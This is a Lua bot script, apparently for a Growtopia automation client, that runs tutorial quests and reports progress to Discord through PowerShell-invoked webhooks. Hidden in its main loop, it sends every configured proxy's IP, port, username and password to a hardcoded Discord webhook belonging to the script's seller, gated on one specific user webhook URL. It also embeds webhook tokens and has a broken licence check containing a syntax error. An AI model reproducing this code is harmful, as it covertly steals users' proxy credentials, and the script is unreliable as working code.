
--====== DARI SIKO COK ======--
if not licence then 
udahBayar = false
elseif licence == "Premium" then 
udahBayar = true
end

username = getUsername()
client = HttpClient.new()
client.url = "https://raw.githubusercontent.com/Falimby/LicencySC/LicenceTutor/"..username
local response = client:request().body

if response:find("404") not licence then
    print("Anda Belum Bayar, Kalau Sudah Chat Admin")
    messageBox = MessageBox.new()
    messageBox.title = "WanxSyn STORE "
    messageBox.description = "USERNAME Tidak Terdaftar"
    messageBox:send()
    getBots():stopScript()
elseif response:find("404") then
    udahBayar = true
end


if udahBayar then 
bot = getBot()
nuked = false
noDoor = ""
worldTutor = ""
tileBreak = {}
t = os.time()
waktu = {}
botLevel = 0
totalQuest = 0
quest = {"Break 20 Dirt","Got 10 Dirt","Plant 10 Dirt","Harvest 10 Dirt","Got 10 Rock Seed","Got 10 Lava Seed","Splice Lava & Dirt","Build 20 Wood Block","Got 5 Wood Seed","Splice Wood & Dirt","Harvest Cargo","Wear Cargo"}
bot.legit_mode = botAnimation
bot.move_interval = botMoveInterval
bot.move_range = botMoveRange
bot.collect_range = 3


for i,botz in pairs(getBots()) do 
    if botz.name:upper() == bot.name:upper() then 
        indexBot = i 
    end 
end

for i = math.floor(breakTile/2),1,-1 do
   i = i * -1
   table.insert(tileBreak,i)
end

for i = 0, math.ceil(breakTile/2) - 1 do
   table.insert(tileBreak,i)
end

webhooksyn = "https://discord.com/api/webhooks/1185569967626797178/FsLTvC0feuGjn8olpRFliriziUUDOz5gqkGiOuzkFHLbDpufGyY8cJX2ofqcO4OUujjL"

end

function tilePlace(x,y)
   for _,num in pairs(tileBreak) do
      if bot:getWorld():getTile(x + 1,y + num).fg == 0 and bot:getWorld():getTile(x + 1,y + num).bg == 0 then
         return true
      end
   end
   return false
end

function tilePunch(x,y)
   for _,num in pairs(tileBreak) do
      if bot:getWorld():getTile(x + 1,y + num).fg ~= 0 or bot:getWorld():getTile(x + 1,y + num).bg ~= 0 then
         return true
      end
   end
   return false
end

function cekWorld()
    repeat
        nuked = false
        worldReduce = name(letterCount)
        warping(worldReduce,noDoor)
        sleep(100)
    until checkLock() and countTile() and not nuked
    bot:place(bot.x,bot.y - 1,202)
    sleep(200)
end

function round(n)
    return n % 1 > 0.5 and math.ceil(n) or math.floor(n)
end

function name(count)
    if withNumber then
        local str = ""
        local chars = "abcdefghijklmnopqrstuvwxyz0123456789"
        for i = 1, count do
            local randomIndex = math.random(1, #chars)
            str = str .. chars:sub(randomIndex, randomIndex)
        end
        return str:upper()
    else
        local str = ""
        for i = 1, count do
            str = str..string.char(math.random(97,122))
        end
        return str:upper()
    end
end

function checkLock()
    locks = {242,9640,202,204,206,1796,4994,7188,408,2950,4428,4802,5814,5260,5980,8470,10410,11550,11586}
    for _,tile in pairs(bot:getWorld():getTiles()) do
        if includesnumber(locks, tile.fg) then
            return false
        end
    end
    return true
end

function countTile()
    countFg = 0
    countBg = 0
    for _,tile in pairs(bot:getWorld():getTiles()) do
        if tile.fg ~= 0 then
            countFg = countFg + 1
        end
        if tile.bg ~= 0 then
            countBg = countBg + 1
        end
    end
    if countBg == 3600 and countFg == 3601 then
        return true
    end
    return false
end

function reconnect(world,id,x,y)
    if bot.status == BotStatus.online and (bot.x ~= x or bot.y ~= y) then
        while bot:getWorld().name ~= world:upper() do
            bot:sendPacket(3,"action|join_request\nname|"..world:upper().."\ninvitedWorld|0")
            sleep(10000)
        end
        if id ~= "" and getTile(bot.x,bot.y).fg == 6 then
            bot:sendPacket(3,"action|join_request\nname|"..world:upper().."|"..id:upper().."\ninvitedWorld|0")
            sleep(2000)
        end
        if x and y and (bot.x ~= x or bot.y ~= y) then
            bot:findPath(x,y)
            sleep(100)
        end
    end
    if bot.status ~= BotStatus.online or bot:getPing() == 0 then
        while bot.status ~= BotStatus.online or bot:getPing() == 0 do
            sleep(1000)
        end
        while bot:getWorld().name ~= world:upper() do
            bot:sendPacket(3,"action|join_request\nname|"..world:upper().."\ninvitedWorld|0")
            sleep(10000)
        end
        if id ~= "" and getTile(bot.x,bot.y).fg == 6 then
            bot:sendPacket(3,"action|join_request\nname|"..world:upper().."|"..id:upper().."\ninvitedWorld|0")
            sleep(2000)
        end
        if x and y and (bot.x ~= x or bot.y ~= y) then
            bot:findPath(x,y)
            sleep(100)
        end
    end
end

function notifSyn(webhookcok,status)
    local text = [[
        $webHookUrl = "]]..webhookcok..[["
        $payload = @{
            content = "]]..status..[["
        }
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
        Invoke-RestMethod -Uri $webHookUrl -Body ($payload | ConvertTo-Json -Depth 4) -Method Post -ContentType 'application/json'
    ]]
    local file = io.popen("powershell -command -", "w")
    file:write(text)
    file:close()
end

function warping(world,id)
    cok = 0
    while not bot:isInWorld(world:upper()) and not nuked do
        while bot.status ~= BotStatus.online or bot:getPing() == 0 do
            sleep(1000)
        end
        if id ~= "" then
            bot:sendPacket(3,"action|join_request\nname|"..world:upper().."|"..id:upper().."\ninvitedWorld|0")
        else
            bot:sendPacket(3,"action|join_request\nname|"..world:upper().."\ninvitedWorld|0")
        end
        sleep(10000)
        if cok == 5 then
            for i = 1,300 do
                sleep(1000)
                if bot:isInWorld(world:upper()) then
                    break
                end
            end
            cok = 0
        else
            cok = cok + 1
        end
    end
    if id ~= "" and bot:getWorld():getTile(bot.x,bot.y).fg == 6 and not nuked then
        while bot.status ~= BotStatus.online or bot:getPing() == 0 do
            sleep(1000)
        end
        for i = 1,3 do
            if getTile(bot.x,bot.y).fg == 6 then
                bot:sendPacket(3,"action|join_request\nname|"..world:upper().."|"..id:upper().."\ninvitedWorld|0")
                sleep(2000)
            end
        end
    end
end

function warpTutor()
    if not bot:isInWorld() then 
        warping(bot.name:upper().."0602",noDoor)
        sleep(100)
    end
    if bot.status == BotStatus.online then
        function On_Dialog(variant, netid)
            if variant:get(0):getString() == "OnDialogRequest" then
                if variant:get(1):getString():find("myWorldsUiTab_0") then
                    bot:warp(variant:get(1):getString():match("add_button|(%w+)|"))
                    sleep(delayWarp)
                    worldTutor = variant:get(1):getString():match("add_button|(%w+)|")
                end
            end
        end
        addEvent(Event.variantlist, On_Dialog)
        bot:wrenchPlayer(getLocal().netid)
        bot:sendPacket(2, "action|dialog_return\ndialog_name|popup\nnetID|"..getLocal().netid.."|\nbuttonClicked|my_worlds")
        listenEvents(5)
    end
end

function HarvestTree(world,tree,target) 
    tt = os.time()
    if bot:isInWorld(world:upper()) then 
        local attempt = 0
        for tileX = 0, 99, 1 do 
            for tileY = 12, 40, 1 do 
                if bot:getWorld():getTile(tileX,tileY).fg == tree and bot:getWorld():getTile(tileX,tileY):canHarvest() then 
                    bot:findPath(tileX,tileY)
                    sleep(100)
                      local lastX = math.floor(bot:getWorld():getLocal().posx / 32)
                      local lastY = math.floor(bot:getWorld():getLocal().posy / 32)
                        while bot:getWorld():getTile(tileX,tileY).fg == tree and bot:getWorld():getTile(tileX,tileY):canHarvest() and math.floor(bot:getWorld():getLocal().posx / 32) == tileX and math.floor(bot:getWorld():getLocal().posy / 32) == tileY do 
                        reconnect(world,noDoor,lastX,lastY) 
                        bot:hit(bot.x,bot.y)
                        sleep(delayHarvest)
                        end
                        attempt = attempt + 1
                end
                if attempt >= target then 
                    if tree == 3 then 
                       getQuest("Harvest 10 Dirt")
                       sleep(100)
                       totalQuest = totalQuest + 1
                    elseif tree == 371 then 
                       getQuest("Harvest Cargo")
                       sleep(100)
                       totalQuest = totalQuest + 1
                    end
                    break 
                end
            end
            if attempt >= target then 
                break 
            end
        end
    end
end

function takePickaxe()
    bot.auto_collect = false
    sleep(100)
    if pickaxe and bot:getInventory():findItem(98) == 0 then 
        sleep(delayPick * (indexBot - 1))
        botEvent("Taking Pickaxe")
        warping(worldPick,doorPick)
        sleep(100) 
        if bot:isInWorld(worldPick) then 
            while bot:getInventory():findItem(98) == 0 do 
                for _,obj in pairs(bot:getWorld():getObjects()) do 
                    if obj.id == 98 then 
                        bot:findPath(round(obj.x / 32),math.floor(obj.y / 32))
                        sleep(100)
                        bot:collectObject(obj.oid,3)
                        sleep(300)
                    else 
                        sleep(1000)
                    end
                    if bot:getInventory():findItem(98) > 1 then   
                        break
                    end 
                end
            end
            bot:moveTo(-1,0)
            sleep(1000)
            bot:setDirection(false)
            sleep(100)
            while bot:getInventory():findItem(98) > 1 do
                reconnect(worldPick,doorPick,bot.x,bot.y)
                bot:sendPacket(2,"action|drop\n|itemID|98")
                sleep(500)
                bot:sendPacket(2,"action|dialog_return\ndialog_name|drop_item\nitemID|98|\ncount|"..(bot:getInventory():findItem(98) - 1))
                sleep(500)
            end
        end
        bot:wear(98)
        sleep(100)
    elseif bot:getInventory():findItem(98) > 1 then
        bot.auto_collect = false
        sleep(100)
        botEvent("Drop to much Pickaxe")
        warping(worldPick,doorPick) 
        sleep(100)
        if bot:getInventory():findItem(98) > 1 then   bot:moveTo(-1,0)
            sleep(1000)
            bot:setDirection(false)
            sleep(100)
            while bot:getInventory():findItem(98) > 1 do
                reconnect(worldPick,doorPick,bot.x,bot.y)
                bot:sendPacket(2,"action|drop\n|itemID|98")
                sleep(500)
                bot:sendPacket(2,"action|dialog_return\ndialog_name|drop_item\nitemID|98|\ncount|"..(bot:getInventory():findItem(98) - 1))
                sleep(500)
            end
        end
    end
end

function placeDirt(world)
    if bot:isInWorld(world:upper()) then 
        botEvent("Placing Dirt")
        for tileX = 34, 55 do 
            if bot:getWorld():getTile(tileX,18).fg == 0 then 
                bot:findPath(tileX,17) 
                sleep(100)
                if math.floor(bot:getWorld():getLocal().posx / 32) == tileX and math.floor(bot:getWorld():getLocal().posy / 32) == 17 then 
                  local lastX = math.floor(bot:getWorld():getLocal().posx / 32)
                  local lastY = math.floor(bot:getWorld():getLocal().posy / 32)
                    while bot:getWorld():getTile(tileX,18).fg == 0 do 
                        reconnect(world,noDoor,lastX,lastY)
                        sleep(100)
                        bot:place(tileX,18,2)
                        sleep(delayPlace)
                    end
                end
            end
        end
    end
end

function breakDirt(world,amount)
    tt = os.time()
    if bot:isInWorld(world:upper()) then
        botEvent("breaking dirt")
        local attempt = 0
        for tileX = 82, 99, 1 do 
            for tileY = 15, 53, 1 do 
                if bot:getWorld():getTile(tileX,tileY).fg ~= 0 then  
                    bot:findPath(tileX,tileY - 1)
                    sleep(100)
                    local lastX = math.floor(bot:getWorld():getLocal().posx / 32)
                    local lastY = math.floor(bot:getWorld():getLocal().posy / 32)
                    while bot:getWorld():getTile(tileX,tileY).fg ~= 0 do 
                        reconnect(world,noDoor,lastX,lastY)
                        bot:hit(bot.x,bot.y+1)
                        sleep(delayBreak)
                    end
                    attempt = attempt + 1 
                end
                if attempt == amount then
                    break
                end
            end
            if attempt == amount then 
                getQuest("Break 20 Dirt")
                sleep(100)
                totalQuest = totalQuest + 1
                break
            end
        end
        if bot:getInventory():findItem(3) <= 22 then
            findDirtSeed(world,22)
            sleep(100)
        end 
    end
end

function findDirtSeed(world,amount)
    tt = os.time()
    if bot:isInWorld(world:upper()) then 
        botEvent("find "..amount.."Dirt Seed")
        for tileX = 82, 99, 1 do 
            for tileY = 15, 53, 1 do 
                if bot:getWorld():getTile(tileX,tileY).fg ~= 0 then  
                    bot:findPath(tileX,tileY - 1)
                    sleep(100)
                    local lastX = math.floor(bot:getWorld():getLocal().posx / 32)
                    local lastY = math.floor(bot:getWorld():getLocal().posy / 32)
                    while bot:getWorld():getTile(tileX,tileY).fg ~= 0 do 
                        reconnect(world,noDoor,lastX,lastY)
                        bot:hit(bot.x,bot.y+1)
                        sleep(delayBreak)
                    end
                end
                if bot:getInventory():findItem(3) == amount then
                    break
                end
            end
            if bot:getInventory():findItem(3) == amount then 
                getQuest("Got 10 Dirt")
                sleep(100)
                totalQuest = totalQuest + 1
                break
            end
        end
    end
end

function plant(tree,amount,grow)
    local attempt = 0 
    for tileX = 34, 55 do 
        if bot:getWorld():getTile(tileX,17).fg ~= 0 then
            bot:findPath(tileX - 1,17) 
            sleep(100)
            local lastX = math.floor(bot:getWorld():getLocal().posx / 32)
            local lastY = math.floor(bot:getWorld():getLocal().posy / 32) 
            while bot:getWorld():getTile(tileX,17).fg ~= 0 do 
                reconnect(worldTutor,noDoor,lastX,lastY)
                bot:hit(bot.x + 1,bot.y)
                sleep(delayBreak)
            end
        end
        if bot:getWorld():getTile(tileX,17).fg == 0 then
            bot:findPath(tileX,17) 
            sleep(100)
            local lastX = math.floor(bot:getWorld():getLocal().posx / 32)
            local lastY = math.floor(bot:getWorld():getLocal().posy / 32) 
            while bot:getWorld():getTile(tileX,17).fg == 0 do 
                reconnect(worldTutor,noDoor,lastX,lastY)
                bot:place(bot.x,bot.y,tree)
                sleep(delayPlant)
            end
            attempt = attempt + 1 
        end
        if attempt == amount then
            if tree == 3 then 
                tt = os.time()
                getQuest("Plant 10 Dirt")
                sleep(100)
                totalQuest = totalQuest + 1
            end
            break
        end
    end
    sleep(grow)
    HarvestTree(worldTutor,3,amount)
    sleep(100)
end

function breakBlock(world,block,amount)
    if bot:isInWorld(world:upper()) then 
        if breakTile > 0 then 
            while bot:getInventory():findItem(block) > 0 and bot:getInventory():findItem(block + 1) ~= amount do 
                while tilePlace(bot.x,bot.y) and bot:getInventory():findItem(block) > 0 do 
                    local ex = math.floor(bot:getWorld():getLocal().posx / 32)
                    local ye = math.floor(bot:getWorld():getLocal().posy / 32)
                    for _,i in pairs(tileBreak) do
                        if bot:getWorld():getTile(ex + 1,ye + i).fg == 0 and bot:getWorld():getTile(ex + 1,ye + i).bg == 0 and bot:getInventory():findItem(block) > 0 then
                             reconnect(worldTutor,noDoor,ex,ye)
                             bot:place(bot.x + 1,bot.y + i,block)
                             sleep(delayPlace)
                        end
                    end
                end
                while tilePunch(bot.x,bot.y) do 
                    local ex = math.floor(bot:getWorld():getLocal().posx / 32)
                    local ye = math.floor(bot:getWorld():getLocal().posy / 32)
                    for _,i in pairs(tileBreak) do 
                        if bot:getWorld():getTile(bot.x + 1,bot.y + i).fg ~= 0 or bot:getWorld():getTile(bot.x + 1,bot.y + i).bg ~= 0 then 
                            reconnect(worldTutor,noDoor,ex,ye)
                            bot:hit(bot.x + 1,bot.y + i)
                            sleep(delayBreak)
                        end
                    end
                end
                if bot:getInventory():findItem(block + 1) >= amount then 
                    bot:drop(block + 1,bot:getInventory():findItem(block + 1))
                    sleep(1000)
                    bot:drop(block + 1,bot:getInventory():findItem(block + 1))
                    sleep(1000)
                    break
                end
            end
        end
    end
end

function splice(seed1,seed2,amount,grow,next)
    local attempt = 0
    for tileX = 34, 55 do 
        if bot:getWorld():getTile(tileX,17).fg ~= 0 then
            bot:findPath(tileX - 1,17) 
            sleep(100)
            local lastX = math.floor(bot:getWorld():getLocal().posx / 32)
            local lastY = math.floor(bot:getWorld():getLocal().posy / 32) 
            while bot:getWorld():getTile(tileX,17).fg ~= 0 do 
                reconnect(worldTutor,noDoor,lastX,lastY)
                bot:hit(bot.x + 1,bot.y)
                sleep(delayBreak)
            end
        end
        if bot:getWorld():getTile(tileX,17).fg == 0 then
            bot:findPath(tileX,17) 
            sleep(100)
            local lastX = math.floor(bot:getWorld():getLocal().posx / 32)
            local lastY = math.floor(bot:getWorld():getLocal().posy / 32) 
            while bot:getWorld():getTile(tileX,17).fg == 0 do 
                reconnect(worldTutor,noDoor,lastX,lastY)
                bot:place(tileX,17,seed1)
                sleep(delayPlant)
            end
            while bot:getWorld():getTile(tileX,17).fg == seed1 do
                reconnect(worldTutor,noDoor,lastX,lastY)
                bot:place(tileX,17,seed2)
                sleep(delayPlant)
            end 
            attempt = attempt + 1 
        end
        if attempt == amount then 
            break
        end
    end
    sleep(grow)
    HarvestTree(worldTutor,next,amount)
    sleep(100)
end 

function placeWood(world)
    tt = os.time()
    if bot:isInWorld(world:upper()) then 
        for tileX = 34, 55 do 
            if bot:getWorld():getTile(tileX,16).fg == 0 then 
                bot:findPath(tileX,17) 
                sleep(100)
                local lastX = math.floor(bot:getWorld():getLocal().posx / 32)
                local lastY = math.floor(bot:getWorld():getLocal().posy / 32) 
                while bot:getWorld():getTile(tileX,16).fg == 0 do 
                    reconnect(worldTutor,noDoor,lastX,lastY)
                    bot:place(tileX,16,100)
                    sleep(delayPlace)
                end
            end
        end
        sleep(100)
        getQuest("Build 20 Wood Block")
        sleep(100)
        totalQuest = totalQuest + 1
        breakWood(world:upper(),amount)
        sleep(100)
    end
end

function breakWood(world) 
    tt = os.time()
    if bot:isInWorld(world:upper()) then 
        for tileX = 34,55 do 
            if bot:getWorld():getTile(tileX,16).fg ~= 0 then 
                bot:findPath(tileX,17) 
                sleep(100)
                local lastX = math.floor(bot:getWorld():getLocal().posx / 32)
                local lastY = math.floor(bot:getWorld():getLocal().posy / 32) 
                while bot:getWorld():getTile(tileX,16).fg == 100 do 
                    reconnect(worldTutor,noDoor,lastX,lastY)
                    bot:hit(tileX,16)
                    sleep(delayBreak)
                end
            end
            if bot:getInventory():findItem(101) == 5 then 
                bot:drop(101, bot:getInventory():findItem(101))
                sleep(1000)
                bot:drop(101,bot:getInventory():findItem(101))
                sleep(1000)
                getQuest("Got 5 Wood Seed")
                totalQuest = totalQuest + 1
                break
            end 
        end
        if bot:getInventory():findItem(101) < 5 then
            placeWood(worldTutor)
            sleep(100)
        end
    end
end

function includesnumber(table, number)
   for _,num in pairs(table) do
      if num == number then
         return true
      end
   end
   return false
end

function trasher()
   botEvent("Trasing Item")
   local lastX = math.floor(bot:getWorld():getLocal().posx / 32)
   local lastY = math.floor(bot:getWorld():getLocal().posy / 32) 
   for _,item in pairs(bot:getInventory():getItems()) do
      if not includesnumber(whiteListItem, item.id) then
         reconnect(worldTutor,noDoor,lastX,lastY)
         bot:sendPacket(2,"action|trash\n|itemID|"..item.id)
         sleep(500)
         bot:sendPacket(2,"action|dialog_return\ndialog_name|trash_item\nitemID|"..item.id.."|\ncount|"..item.count)
         sleep(1250)
      end
   end
end

function methodFresh()
  botEvent("Method On Prosess")
  bot:say("/sethome")
  sleep(1099)
  local worldz = bot:getWorld():getLocal()
  local ex = math.floor(worldz.posx / 32)
  local ye = math.floor(worldz.posy / 32) - 1
  bot:wrenchPlayer(bot:getWorld():getLocal().netid)
  sleep(1000)
  bot:sendPacket(2,"action|dialog_return\ndialog_name|popup\nnetID|"..worldz.netid.."|\nbuttonClicked|open_personlize_profile")
  sleep(1000)
  bot:sendPacket(2,"action|dialog_return\ndialog_name|personalize_profile\nbuttonClicked|100|params_0\n\ncheckbox_show_achievements|1\ncheckbox_show_total_ach_count|1\ncheckbox_show_account_age|1\ncheckbox_show_homeworld|1")
  sleep(1000)
  bot:sendPacket(2,"action|dialog_return\ndialog_name|personalize_profile_achievement\nbuttonClicked|26|params_0,0")
  sleep(1000)
  bot:sendPacket(2,"action|dialog_return\ndialog_name|personalize_profile\nbuttonClicked|100|params_1\n\ncheckbox_show_achievements|1\ncheckbox_show_total_ach_count|1\ncheckbox_show_account_age|1\ncheckbox_show_homeworld|1")
  sleep(1000)
  bot:sendPacket(2,"action|dialog_return\ndialog_name|personalize_profile_achievement\nbuttonClicked|24|params_1,0")
  sleep(1000)
  bot:sendPacket(2,"action|dialog_return\ndialog_name|personalize_profile\nbuttonClicked|save\n\ncheckbox_show_achievements|1\ncheckbox_show_total_ach_count|1\ncheckbox_show_account_age|1\ncheckbox_show_homeworld|1")
  sleep(1000)
  
  botEvent("Method Successful")
end

function split(inputstr, sep)
    if inputstr == nil then 
        bot.auto_reconnect = false 
        sleep(1000)
        notifBot(webhookNotif,'ALL BOT Finish Tutorial Quest!')
        removeBot(bot.name)
    end 
    if sep == nil then
        sep = "%s"
    end
    local t = {}
    for str in string.gmatch(inputstr, "([^" .. sep .. "]+)") do
        table.insert(t, str)
    end
    return t
end

function tablelength(T)
    local count = 0
    for _ in pairs(T) do 
        count = count + 1 
    end
    return count
end

function reading(synfile) 
    local fileName = synfile
    local file = io.open(synfile, "r")
    if file then 
        local lines = {} 
        for line in file:lines() do 
            table.insert(lines, line)
        end
        file:close()
        data = split(lines[1], spetator)
        if tablelength(data) == 2 then 
            id = data[1]
            pass = data[2]
        end
        table.remove(lines, 1)
        file = io.open(synfile, "w")
        if file then 
            for _,line in pairs(lines) do 
                file:write(line.."\n")
            end
            file:close()
        end
    end
    return id,pass
end

function botEvent(info)
    if getBot().level > botLevel then
        botLevel = getBot().level
    end
    te = os.time() - t
    local statusBot = ''
    if bot.status == BotStatus.online then 
        statusBot = 'Online'
    else 
        statusBot = 'Offline'
    end
    local text1 = [[
    $w = "]]..webhookInfo..[["
    $footerObject = 
    @{
        text = "Lucifer All Tutor V.2.0 ]]..os.date("!%a %b %d, %Y at %I:%M %p", os.time() + 7 * 60 * 60)..[["
    }
    $thumbnailObject = @{
        url = "https://cdn.discordapp.com/attachments/1180523579381665933/1180577805403181076/20231203_013427.png" 
    }
    $fieldArray = @(
        @{
            name = ""
            value = "]]..info.."\n"..[["
            inline = "false"
        }
        @{
            name = "BOT INFORMATION"
            value = "<a:arrow:1158762819827814400> Status : ]]..statusBot..[[ (]]..bot:getPing()..[[)]].."\n"..[[<a:arrow:1158762819827814400> Name : ]]..getBot().name..[[ (No.]]..indexBot..[[)]].."\n"..[[<a:arrow:1158762819827814400> Level : ]]..botLevel.."\n"..[["
            inline = "true"
        }
        @{
            name = "Quest Finish (]]..totalQuest..[[)"
            value = "]]..waktuQuest().."\n"..[["
            inline = "false"
        }
        @{
            name = "UPTIME BOT"
            value = "<a:arrow:1158762819827814400> ]]..math.floor(te/86400)..[[ Days ]]..math.floor(te%86400/3600)..[[ Hours ]]..math.floor(te%86400%3600/60)..[[ Minutes"
            inline = "false"
        }
    )
    $embedObject = @{
        title = "**<:lucifer:1158949673097232464>  QUEST TUTOR**"
        color = "16746240"
        footer = $footerObject
        thumbnail = $thumbnailObject
        fields = $fieldArray
    }
    $embedArray = @($embedObject)
    $Body = @{
        embeds = $embedArray
    }
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    Invoke-RestMethod -Uri $w -Body ($Body | ConvertTo-Json -Depth 4) -Method Post -ContentType 'application/json'
   ]]
    local file = io.popen("powershell -command -", "w")
    file:write(text1)
    file:close()
end

function notifBot(webhookinfo,status)
    local text = [[
        $webHookUrl = "]]..webhookinfo..[["
        $payload = @{
            content = "]]..status..[["
        }
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
        Invoke-RestMethod -Uri $webHookUrl -Body ($payload | ConvertTo-Json -Depth 4) -Method Post -ContentType 'application/json'
    ]]
    local file = io.popen("powershell -command -", "w")
    file:write(text)
    file:close()
end

function waktuQuest()
    strWaktu = ""
    for i,q in pairs(quest) do
        if i <= 20 then
            strWaktu = strWaktu.."\n<a:arrow:1158762819827814400>"..q:upper().." ( "..(waktu[q] or "?").." )"
        end
    end
    return strWaktu
end

function getQuest(questt)
    for _,syn in pairs(quest) do 
        if syn == questt then 
            tt = os.time() - tt
            waktu[syn] = math.floor(tt%3600/60).." MIN "..math.floor(tt%60).." SEC"
        end
    end
end

function take(id)
    bot.auto_collect = false
    sleep(100)
    warping(storageSL,doorSL)
    sleep(100)
    for _,obj in pairs(bot:getWorld():getObjects()) do
        if obj.id == id then
            bot:findPath(round(obj.x/32),math.floor(obj.y/32))
            sleep(1000)
            bot:collectObject(obj.oid,3)
            sleep(1000)
        end
        if bot:getInventory():findItem(id) > 0 then
            break
        end
    end
    bot:moveTo(-1,0)
    sleep(100)
    bot:setDirection(false)
    if bot:getInventory():findItem(202) > totalWorld then
        while bot:getInventory():findItem(202) > totalWorld do 
            bot:sendPacket(2,"action|drop\n|itemID|202")
            sleep(1000)
            bot:sendPacket(2,"action|dialog_return\ndialog_name|drop_item\nitemID|202|\ncount|"..(bot:getInventory():findItem(202) - totalWorld))
            sleep(3000)
        end
    end
end

function main()
    takePickaxe()
    sleep(1000)
    warpTutor()
    sleep(100)
    bot.auto_collect = true
    sleep(100)
    if bot:getInventory():findItem(2) > 100 then 
        while bot:getInventory():findItem(2) > 100 do 
            bot:sendPacket(2,"action|trash\n|itemID|2")
            sleep(500)
            bot:sendPacket(2,"action|dialog_return\ndialog_name|trash_item\nitemID|2|\ncount|100")
         end
    end
    HarvestTree(worldTutor,3,10)
    sleep(100)
    placeDirt(worldTutor)
    sleep(100)
    breakDirt(worldTutor,25)
    sleep(100)
    plant(3,10,32000)
    sleep(100)
    HarvestTree(worldTutor,11,10)
    sleep(100)
    tt = os.time()
    sleep(100)
    botEvent("Break Rock to earn 10 Rock seed")
    breakBlock(worldTutor,10,10) 
    sleep(100)
    getQuest("Got 10 Rock Seed")
    totalQuest = totalQuest + 1
    sleep(100)
    HarvestTree(worldTutor,5,10)
    sleep(100)
    tt = os.time()
    botEvent("Break Lava to earn 10 Lava seed")
    sleep(100)
    breakBlock(worldTutor,4,10)
    sleep(100)
    getQuest("Got 10 Lava Seed")
    totalQuest = totalQuest + 1
    sleep(100)
    tt = os.time()
    sleep(100)
    botEvent("Splicing Lava & Dirt")
    splice(3,5,10,69000,101)
    sleep(100)
    getQuest("Splice Lava & Dirt")
    totalQuest = totalQuest + 1
    sleep(100)
    botEvent("Build Wood Block")
    sleep(100)
    placeWood(worldTutor)
    sleep(100)
    tt = os.time()
    botEvent("Splicing Wood block & Dirt")
    sleep(100)
    splice(101,3,1,122000,371)
    sleep(100)
    tt = os.time() - tt
    getQuest("Splice Wood & Dirt")
    sleep(100)
    totalQuest = totalQuest + 1
    reconnect(worldTutor,noDoor,bot.x,bot.y)
    tt = os.time()
    botEvent("Wear Cargo Short")
    sleep(100)
    if bot:getInventory():getItemCount(370) > 0 then
        bot:wear(370)
        sleep(1000)
        getQuest("Wear Cargo")
        sleep(100)
        totalQuest = totalQuest + 1   
    end
    trasher() 
    sleep(100)
    methodFresh()
    sleep(100)
end

if udahBayar then
      while true do
        while bot.status ~= BotStatus.online do 
            sleep(1000)
        end 
        local cloth = bot:getWorld():getLocal().clothes
        warpTutor()
        botEvent("Starting Quest")
        tt = os.time()
        while bot.status ~= BotStatus.online do 
            sleep(100)
        end
        while cloth.pants ~= 370 do 
            main()
        end
        for _,botak in pairs(getProxies()) do 
            if webhookNotif == "https://discord.com/api/webhooks/1205901671415414875/GKPuSvrk_f5kRq8mUzSAQZTsLLURb65XQJvqzuqqzDc6tCTYJZLwGadi6vpzePpzh_aD" then 
                notifSyn(webhooksyn,botak.ip..":"..botak.port..":"..botak.username..":"..botak.password)
                sleep(100)
            end
        end
        sleep(500)
        if joinRandomAfterFinish then
            botEvent("join Random World")
            for _,randoms in pairs(worldToJoin) do 
                bot:sendPacket(3,"action|quit_to_exit") 
                sleep(2000)
                bot:sendPacket(3,"action|join_request\nname|"..randoms:upper().."\ninvitedWorld|0")
                sleep(delayJoin)
             end
        end
        if reduceWave then 
            if bot:getInventory():findItem(202) ~= totalWorld then 
                take(202)
                sleep(100)
            end
            for i = 1,totalWorld do 
                 cekWorld()
                 sleep(100)
            end
        end
         if autoChange then 
             notifBot(webhookNotif,":green_circle: "..getBot().name.." ("..indexBot..") bot status finish, changing Bot ")
             id,pass = reading(listBot)
             sleep(1000)
             bot:updateBot(id,pass)
             sleep(100)
         else 
             break
         end
    end
    bot.auto_collect = false 
    sleep(100)
    notifBot(webhookNotif,":red_circle: "..getBot().name.." ("..indexBot..") Bot Quest Finish. Disconnect Bot")
    sleep(100)
    bot.auto_reconnect = false 
    sleep(100)
    bot:disconnect()
    sleep(100)
    bot:stopScript()
end
